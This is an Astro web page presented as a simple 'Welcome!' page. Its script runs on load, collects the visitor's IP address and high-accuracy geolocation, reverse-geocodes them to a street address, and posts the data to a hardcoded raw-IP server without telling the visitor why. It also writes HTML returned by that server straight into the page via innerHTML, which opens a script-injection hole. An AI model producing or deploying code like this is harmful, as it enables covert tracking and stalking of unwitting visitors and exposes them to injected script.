import Layout from '../layouts/Layout.astro';
---

<Layout>
  <main>
    <h1>Welcome!</h1>
    <div id="visitor-info">Loading...</div>
    <div id="map-container" style="display:none; width: 100%; height: 400px; margin-top: 20px;"></div>
  </main>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
      function getVisitorInfo() {
        fetch('https://api.ipify.org?format=json')
          .then(response => response.json())
          .then(data => {
            const ipAddress = data.ip;
            if (navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(
                (position) => {
                  const latitude = position.coords.latitude;
                  const longitude = position.coords.longitude;

                  fetch(`https://geocode.maps.co/reverse?lat=${latitude}&lon=${longitude}`)
                    .then(response => response.json())
                    .then(locationData => {
                      let locationString = "Location: ";
                      if (locationData.display_name) {
                        locationString += locationData.display_name;
                      } else {
                        locationString += `Latitude: ${latitude}, Longitude: ${longitude}`;
                      }

                      // --- Send data to your VPS ---
                      const data = {
                        ip: ipAddress,
                        location: locationString,
                        latitude: latitude,
                        longitude: longitude
                      };

                      fetch('https://95.111.255.206/send-location', { // Replace with your VPS address and port
                        method: 'POST',
                        headers: {
                          'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(data),
                      })
                        .then(response => {
                          if (!response.ok) {
                            throw new Error(`HTTP error! status: ${response.status}`);
                          }
                          return response.json();
                        })
                        .then(result => {
                          console.log('Location data sent successfully:', result);

                          // Display map embed using the returned Google Maps embed code
                          const mapEmbedCode = result.map_embed_code;
                          const mapContainer = document.getElementById('map-container');
                          mapContainer.innerHTML = mapEmbedCode;
                          mapContainer.style.display = 'block';
                        })
                        .catch(error => {
                          console.error('Error sending location data:', error);
                        });
                      // --- End send data to VPS ---

                      document.getElementById('visitor-info').textContent = `IP: ${ipAddress}, ${locationString}`;
                    })
                    .catch(error => {
                      console.error('Error getting location details:', error);
                    });
                },
                (error) => {
                  console.error('Error getting geolocation:', error);
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
              );
            } else {
              console.error('Geolocation is not supported by this browser.');
            }
          })
          .catch(error => {
            console.error('Could not get IP address:', error);
          });
      }

      getVisitorInfo();
    });
  </script>
</Layout>
